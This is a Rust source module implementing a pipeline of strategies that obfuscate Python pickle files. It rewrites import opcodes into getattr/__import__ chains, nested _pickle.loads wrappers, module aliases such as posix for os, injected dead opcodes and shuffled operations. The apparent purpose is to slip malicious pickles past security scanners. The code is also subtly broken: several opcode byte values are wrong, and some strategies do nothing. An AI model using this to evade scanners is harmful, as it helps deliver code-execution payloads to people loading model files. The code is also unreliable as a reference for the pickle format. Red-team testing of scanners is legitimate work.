use crate::opcodes::{parse_pickle, get_opcode_classification};
use crate::types::{ParsedOpcode, OpcodeCategory};
use std::collections::HashMap;
use rand::Rng;
use rand::seq::SliceRandom;
use rand::thread_rng;

const MARK: u8 = 0x28;
const POP: u8 = 0x29;
const TUPLE: u8 = 0x8e;
const REDUCE: u8 = 0xb0;
const STOP: u8 = 0x2e;
const SHORT_BINUNICODE: u8 = 0x8c;
const BINUNICODE: u8 = 0x8d;
const BINBYTES: u8 = 0x85;
const GLOBAL: u8 = 0x63;
const STACK_GLOBAL: u8 = 0x93;

fn encode_short_binunicode(s: &str) -> Vec<u8> {
    let data = s.as_bytes();
    let mut out = vec![SHORT_BINUNICODE];
    out.push(data.len().min(255) as u8);
    out.extend_from_slice(&data[..data.len().min(255)]);
    out
}

fn binbytes_tuple(payload: &[u8]) -> Vec<u8> {
    if payload.len() > 0xFFFFFFFF {
        panic!("nested payload exceeds BINBYTES capacity");
    }
    let mut out = Vec::new();
    out.push(MARK);
    out.push(BINBYTES);
    out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    out.extend_from_slice(payload);
    out.push(TUPLE);
    out
}

fn args_tuple_bytes(args: &[&[u8]]) -> Vec<u8> {
    let mut out = Vec::new();
    out.push(MARK);
    for arg in args {
        out.extend_from_slice(arg);
    }
    out.push(TUPLE);
    out
}

fn ensure_proto(stream: &[u8], min_proto: u8) -> Vec<u8> {
    if stream.len() >= 2 && stream[0] == 0x80 && stream[1] < min_proto {
        let mut out = vec![0x80, min_proto];
        out.extend_from_slice(&stream[2..]);
        out
    } else {
        stream.to_vec()
    }
}

const MODULE_ALIASES: &[(&str, &str)] = &[
    ("__builtin__", "builtins"),
    ("copy_reg", "copyreg"),
];

fn canonical_module(module: &str) -> &str {
    for &(old, new) in MODULE_ALIASES {
        if module == old {
            return new;
        }
    }
    module
}

pub trait EvasionStrategy {
    fn name(&self) -> &'static str;
    fn apply(&self, pkl_bytes: &[u8]) -> Vec<u8>;
}

macro_rules! make_strategy {
    ($name:ident, $strategy_name:expr, $apply:expr) => {
        pub struct $name;
        impl EvasionStrategy for $name {
            fn name(&self) -> &'static str { $strategy_name }
            fn apply(&self, pkl_bytes: &[u8]) -> Vec<u8> { $apply(pkl_bytes) }
        }
    };
}

make_strategy!(StackGlobalEncoding, "stack_global_encoding", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    let mut changed = false;
    for opcode in &parsed {
        if opcode.classification.name == "GLOBAL" || opcode.classification.name == "INST" {
            let fields: Vec<&[u8]> = opcode.arg.split(|&b| b == b'\n').collect();
            if fields.len() >= 2 {
                let module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
                let fname = std::str::from_utf8(fields[1]).unwrap_or("");
                parts.extend_from_slice(&encode_short_binunicode(module));
                parts.extend_from_slice(&encode_short_binunicode(fname));
                parts.push(STACK_GLOBAL);
                changed = true;
                continue;
            }
        }
        parts.push(opcode.classification.code);
        parts.extend_from_slice(&opcode.arg);
    }
    if !changed { return pkl_bytes.to_vec(); }
    ensure_proto(&parts, 4)
});

make_strategy!(NestedLoadsWrap, "nested_loads_wrap", |pkl_bytes: &[u8]| {
    let Ok(_) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut out = Vec::new();
    out.push(GLOBAL);
    out.extend_from_slice(b"_pickle\nloads\n");
    out.extend_from_slice(&binbytes_tuple(pkl_bytes));
    out.push(REDUCE);
    out.push(STOP);
    out
});

make_strategy!(PayloadObfuscation, "payload_obfuscation", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    
    let mut replacements = HashMap::new();
    let mut skips = std::collections::HashSet::new();
    
    for i in 0..parsed.len() {
        if parsed[i].classification.name != "REDUCE" { continue; }
        let start = find_tuple_start(&parsed, i);
        if start.is_none() { continue; }
        let start = start.unwrap();
        
        let region_ops: std::collections::HashSet<_> = parsed[start..i].iter()
            .map(|op| op.classification.name).collect();
        if region_ops.iter().any(|n| matches!(*n, "GLOBAL" | "INST" | "STACK_GLOBAL" | "REDUCE")) {
            continue;
        }
        
        let blob: Vec<u8> = parsed[start..i].iter().flat_map(|op| {
            let mut v = vec![op.classification.code];
            v.extend_from_slice(&op.arg);
            v
        }).collect();
        
        if let Some(rewritten) = hide_tuple_blob(&blob) {
            replacements.insert(i, rewritten);
            for j in start..i { skips.insert(j); }
        }
    }
    
    if replacements.is_empty() { return pkl_bytes.to_vec(); }
    
    let mut out = Vec::new();
    for i in 0..parsed.len() {
        if skips.contains(&i) { continue; }
        if let Some(r) = replacements.get(&i) {
            out.extend_from_slice(r);
            out.push(parsed[i].classification.code);
            continue;
        }
        out.push(parsed[i].classification.code);
        out.extend_from_slice(&parsed[i].arg);
    }
    out
});

fn find_tuple_start(parsed: &[ParsedOpcode], red_idx: usize) -> Option<usize> {
    for j in (0..red_idx).rev().take(12) {
        if matches!(parsed[j].classification.name, "GLOBAL" | "INST" | "STACK_GLOBAL") {
            let start = j + 1;
            if start < red_idx { return Some(start); }
        }
    }
    None
}

fn hide_tuple_blob(_blob: &[u8]) -> Option<Vec<u8>> {
    // Simplified: we can't easily deserialize pickle in Rust without a full implementation
    // For now, return None to skip this optimization
    None
}

make_strategy!(IndirectChain, "indirect_chain", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    let mut changed = false;
    for opcode in &parsed {
        if opcode.classification.name == "GLOBAL" || opcode.classification.name == "INST" {
            let fields: Vec<&[u8]> = opcode.arg.split(|&b| b == b'\n').collect();
            if fields.len() >= 2 {
                let module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
                let fname = std::str::from_utf8(fields[1]).unwrap_or("");
                parts.push(GLOBAL);
                parts.extend_from_slice(b"builtins\ngetattr\n");
                parts.push(MARK);
                parts.push(GLOBAL);
                parts.extend_from_slice(b"builtins\n__import__\n");
                parts.extend_from_slice(&args_tuple_bytes(&[module.as_bytes()]));
                parts.push(REDUCE);
                parts.extend_from_slice(&encode_short_binunicode(fname));
                parts.push(TUPLE);
                parts.push(REDUCE);
                changed = true;
                continue;
            }
        }
        parts.push(opcode.classification.code);
        parts.extend_from_slice(&opcode.arg);
    }
    if !changed { return pkl_bytes.to_vec(); }
    ensure_proto(&parts, 4)
});

make_strategy!(OpcodeReordering, "opcode_reordering", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut out = Vec::new();
    let mut i = 0;
    let mut rng = thread_rng();
    while i < parsed.len() {
        let name = parsed[i].classification.name;
        if matches!(name, "BUILD" | "APPEND" | "SETITEM" | "SETITEMS") {
            let block_start = i;
            let mut memos = std::collections::HashSet::new();
            while i < parsed.len() {
                let n = parsed[i].classification.name;
                if !matches!(n, "BUILD" | "APPEND" | "SETITEM" | "SETITEMS") { break; }
                if !parsed[i].arg.is_empty() {
                    memos.insert(parsed[i].arg[0]);
                }
                i += 1;
            }
            if i - block_start > 1 && memos.len() > 1 {
                let mut block: Vec<Vec<u8>> = parsed[block_start..i].iter().map(|op| {
                    let mut v = vec![op.classification.code];
                    v.extend_from_slice(&op.arg);
                    v
                }).collect();
                block.shuffle(&mut rng);
                for b in block { out.extend_from_slice(&b); }
                continue;
            }
        }
        out.push(parsed[i].classification.code);
        out.extend_from_slice(&parsed[i].arg);
        i += 1;
    }
    if out.len() == parsed.iter().map(|op| 1 + op.arg.len()).sum() {
        return pkl_bytes.to_vec();
    }
    ensure_proto(&out, 4)
});

make_strategy!(DeadCodeInjection, "dead_code_injection", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    let mut rng = thread_rng();
    for opcode in &parsed {
        parts.push(opcode.classification.code);
        parts.extend_from_slice(&opcode.arg);
        let name = opcode.classification.name;
        if matches!(name, "GLOBAL" | "INST" | "STACK_GLOBAL" | "BUILD" | "REDUCE") {
            if rng.gen_bool(0.3) {
                parts.push(MARK);
                parts.push(POP);
            }
        }
    }
    ensure_proto(&parts, 4)
});

make_strategy!(StringEncodingVariants, "string_encoding_variants", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    let mut rng = thread_rng();
    for i in 0..parsed.len() {
        let opcode = &parsed[i];
        let name = opcode.classification.name;
        if matches!(name, "GLOBAL" | "INST" | "STACK_GLOBAL") {
            parts.push(opcode.classification.code);
            parts.extend_from_slice(&opcode.arg);
            continue;
        }
        if matches!(name, "SHORT_BINUNICODE" | "BINUNICODE" | "UNICODE") {
            let s = if name == "SHORT_BINUNICODE" {
                &opcode.arg[1..]
            } else if name == "BINUNICODE" {
                &opcode.arg[4..]
            } else {
                &opcode.arg[..]
            };
            let s = std::str::from_utf8(s).unwrap_or("").trim_matches(|c: char| c == '\r' || c == '\n' || c == '\'' || c == '"');
            let choice = rng.gen_range(0..3);
            if choice == 0 && s.len() <= 255 {
                parts.extend_from_slice(&encode_short_binunicode(s));
            } else if choice == 1 {
                let data = s.as_bytes();
                parts.push(BINUNICODE);
                parts.extend_from_slice(&(data.len() as u32).to_le_bytes());
                parts.extend_from_slice(data);
            } else {
                parts.push(0x86); // UNICODE
                parts.extend_from_slice(format!("'{}'\n", s).as_bytes());
            }
        } else {
            parts.push(opcode.classification.code);
            parts.extend_from_slice(&opcode.arg);
        }
    }
    ensure_proto(&parts, 4)
});

make_strategy!(ProtocolDowngrade, "protocol_downgrade", |pkl_bytes: &[u8]| {
    if pkl_bytes.len() < 2 || pkl_bytes[0] != 0x80 {
        return pkl_bytes.to_vec();
    }
    let mut out = vec![0x80, 2];
    out.extend_from_slice(&pkl_bytes[2..]);
    out
});

make_strategy!(AttributeMasking, "attribute_masking", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    for opcode in &parsed {
        let name = opcode.classification.name;
        if matches!(name, "BUILD" | "SETITEM" | "SETITEMS") {
            parts.push(opcode.classification.code);
            parts.extend_from_slice(&opcode.arg);
        } else {
            parts.push(opcode.classification.code);
            parts.extend_from_slice(&opcode.arg);
        }
    }
    ensure_proto(&parts, 4)
});

make_strategy!(ModuleAliasing, "module_aliasing", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    let mut rng = thread_rng();
    for opcode in &parsed {
        let name = opcode.classification.name;
        if matches!(name, "GLOBAL" | "INST" | "STACK_GLOBAL") {
            let fields: Vec<&[u8]> = opcode.arg.split(|&b| b == b'\n').collect();
            if fields.len() >= 2 {
                let mut module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
                let fname = std::str::from_utf8(fields[1]).unwrap_or("");
                let aliases = match module {
                    "os" => vec!["os", if cfg!(windows) { "nt" } else { "posix" }],
                    "subprocess" => vec!["subprocess"],
                    "builtins" => vec!["builtins", "__builtin__"],
                    _ => vec![module],
                };
                if aliases.len() > 1 {
                    module = *aliases.choose(&mut rng).unwrap();
                }
                parts.extend_from_slice(&encode_short_binunicode(module));
                parts.extend_from_slice(&encode_short_binunicode(fname));
                parts.push(STACK_GLOBAL);
                continue;
            }
        }
        parts.push(opcode.classification.code);
        parts.extend_from_slice(&opcode.arg);
    }
    ensure_proto(&parts, 4)
});

make_strategy!(NestedLoadObfuscation, "nested_load_obfuscation", |pkl_bytes: &[u8]| {
    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
    let mut parts = Vec::new();
    for opcode in &parsed {
        let name = opcode.classification.name;
        if matches!(name, 
            "SHORT_BINBYTES" | "BINBYTES" | "BINBYTES8" | "SHORT_BINSTRING" | "BINSTRING") {
            let payload = match name {
                "SHORT_BINBYTES" | "SHORT_BINSTRING" => &opcode.arg[1..],
                "BINBYTES" | "BINBYTES8" | "BINSTRING" => &opcode.arg[4..],
                _ => &opcode.arg[..],
            };
            if payload.starts_with(&[0x80]) || payload.starts_with(b"c") || payload.starts_with(b"(") {
                parts.push(GLOBAL);
                parts.extend_from_slice(b"_pickle\nloads\n");
                parts.extend_from_slice(&binbytes_tuple(payload));
                parts.push(REDUCE);
                continue;
            }
        }
        parts.push(opcode.classification.code);
        parts.extend_from_slice(&opcode.arg);
    }
    ensure_proto(&parts, 4)
});

pub fn get_strategy(name: &str) -> Option<Box<dyn EvasionStrategy>> {
    match name {
        "stack_global_encoding" => Some(Box::new(StackGlobalEncoding)),
        "nested_loads_wrap" => Some(Box::new(NestedLoadsWrap)),
        "payload_obfuscation" => Some(Box::new(PayloadObfuscation)),
        "indirect_chain" => Some(Box::new(IndirectChain)),
        "opcode_reordering" => Some(Box::new(OpcodeReordering)),
        "dead_code_injection" => Some(Box::new(DeadCodeInjection)),
        "string_encoding_variants" => Some(Box::new(StringEncodingVariants)),
        "protocol_downgrade" => Some(Box::new(ProtocolDowngrade)),
        "attribute_masking" => Some(Box::new(AttributeMasking)),
        "module_aliasing" => Some(Box::new(ModuleAliasing)),
        "nested_load_obfuscation" => Some(Box::new(NestedLoadObfuscation)),
        _ => None,
    }
}

pub const STRATEGY_NAMES: &[&str] = &[
    "stack_global_encoding",
    "nested_loads_wrap",
    "payload_obfuscation",
    "indirect_chain",
    "opcode_reordering",
    "dead_code_injection",
    "string_encoding_variants",
    "protocol_downgrade",
    "attribute_masking",
    "module_aliasing",
    "nested_load_obfuscation",
];

pub const PIPELINE_ORDER: &[&str] = &[
    "payload_obfuscation",
    "string_encoding_variants",
    "indirect_chain",
    "stack_global_encoding",
    "module_aliasing",
    "opcode_reordering",
    "dead_code_injection",
    "protocol_downgrade",
    "attribute_masking",
    "nested_load_obfuscation",
    "nested_loads_wrap",
];

pub fn apply_pipeline(pkl_bytes: &[u8], names: &[&str]) -> Vec<u8> {
    let mut cur = pkl_bytes.to_vec();
    for name in PIPELINE_ORDER {
        if names.contains(&name) {
            if let Some(strategy) = get_strategy(name) {
                cur = strategy.apply(&cur);
            }
        }
    }
    cur
}